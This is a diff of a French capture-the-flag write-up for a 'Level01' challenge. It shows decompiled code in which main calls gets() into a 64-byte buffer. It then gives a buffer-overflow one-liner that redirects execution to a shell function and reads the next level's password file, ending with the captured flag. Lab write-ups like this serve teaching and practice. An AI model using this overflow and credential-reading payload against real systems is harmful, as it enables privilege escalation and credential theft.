@@ -1,52 +1,50 @@
-gdb level1
+# Rapport CTF - [Level01]
 
-le main :                                                
-0x8048480 <main>        push   %ebp                 
-0x8048481 <main+1>      mov    %esp,%ebp            
-0x8048483 <main+3>      and    $0xfffffff0,%esp     
-0x8048486 <main+6>      sub    $0x50,%esp           
-0x8048489 <main+9>      lea    0x10(%esp),%eax      
-0x804848d <main+13>     mov    %eax,(%esp)          
-0x8048490 <main+16>     call   0x8048340 <gets@plt> 
-0x8048495 <main+21>     leave
-0x8048496 <main+22>     ret
+### Observation :
+En arrivant sur le level1 on trouve un exécutable nommé level1. \
+Quand nous essayons de le lancer, nous pouvons écrire une chaîne de caractère puis le programme ce stop. \
+Regardons donc avec gdb ou un decompilateur.
 
-ainsi que la fonction run: 
-│0x8048444 <run>                 push   %ebp
-│0x8048445 <run+1>               mov    %esp,%ebp 
-│0x8048447 <run+3>               sub    $0x18,%esp
-│0x804844a <run+6>               mov    0x80497c0,%eax
-│0x804844f <run+11>              mov    %eax,%edx 
-│0x8048451 <run+13>              mov    $0x8048570,%eax 
-│0x8048456 <run+18>              mov    %edx,0xc(%esp) 
-│0x804845a <run+22>              movl   $0x13,0x8(%esp) 
-│0x8048462 <run+30>              movl   $0x1,0x4(%esp) 
-│0x804846a <run+38>              mov    %eax,(%esp)  
-│0x804846d <run+41>              call   0x8048350 <fwrite@plt>  
-│0x8048472 <run+46>              movl   $0x8048584,(%esp)
-│0x8048479 <run+53>              call   0x8048360 <system@plt>
-│0x804847e <run+58>              leave
-│0x804847f <run+59>              ret 
 
-en lancant le binaire dans hex ray ou ghidra on obtient :
-
+### Explication de Code :
+En lançant le binaire dans hex-ray ou ghidra nous obtenons :
+```c
+//----- (08048444) --------------------------------------------------------
 int run()
 {
-  return system("/bin/sh");
+fwrite("Good... Wait what?\n", 1u, 0x13u, stdout);
+return system("/bin/sh");
 }
 
 //----- (08048480) --------------------------------------------------------
 int __cdecl main(int argc, const char **argv, const char **envp)
 {
-  char s[64]; // [esp+10h] [ebp-40h] BYREF
+char s[64]; // [esp+10h] [ebp-40h] BYREF
 
-  return (int)gets(s);
+return (int)gets(s);
 }
+```
+On peut voir qu'il existe une fonction `run()` qui permet de /bin/sh avec l'utilisateur level2. \
+Malheureusement, cette fonction n'est jamais exécutée, nous devons donc trouver une manière de l'exécuter.
 
-le but est de lancer la fonction run() pour obtenir un shell avec les droits de l'utilisateur level2
-on peux donc voir que la fonction run() est appelée si on arrive à écrire plus de 64 caractères dans la variable s
+### Solution :
 
-on fait la commande suivante pour obtenir le flag :
-(python -c "print('A' * 76 + '\x44\x84\x04\x08')" ; echo "cat /home/user/level2/.pass") | ./level1
-Good... Wait what?
+Le but est de lancer la fonction run() pour obtenir un shell avec les droits de l'utilisateur level2
+Pour ce faire, il nous suffit de buffer overflow `s` avec plus de 64 octets pour remplacer l'adresse de retour, cela va nous faire jump dans notre fonction `run()`
+
+Pour trouver notre adresse de `run` rien de plus simple nous pouvons regarder notre adresse avec gdb ou regarder hex-ray qui nous l'affiche directement au-dessus de la fonction  `(08048444)`
+
+Comme nous sommes en little endian nous devons donc retourner notre chaîne de caractère pour que le binaire puisse le comprendre. \
+Cet iterateur python permet de retourner une string : `[::-1]`
+
+Nous regardons ensuite la stack de notre main avec gdb qui est égal a `0x50u` donc 80 octets, pour écraser l'adresse de notre return, il nous faut donc écrire `80 - 4 = 76` octets random puis notre adresse.
+
+On fait la commande suivante pour obtenir le flag :
+```sh
+(python -c "print('A' * 76 + '\x08\x04\x84\x44'[::-1])" ; echo "cat /home/user/level2/.pass") | ./level1
+```
+### Resultat:
+```sh
+Good... Wait what? 
 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+```
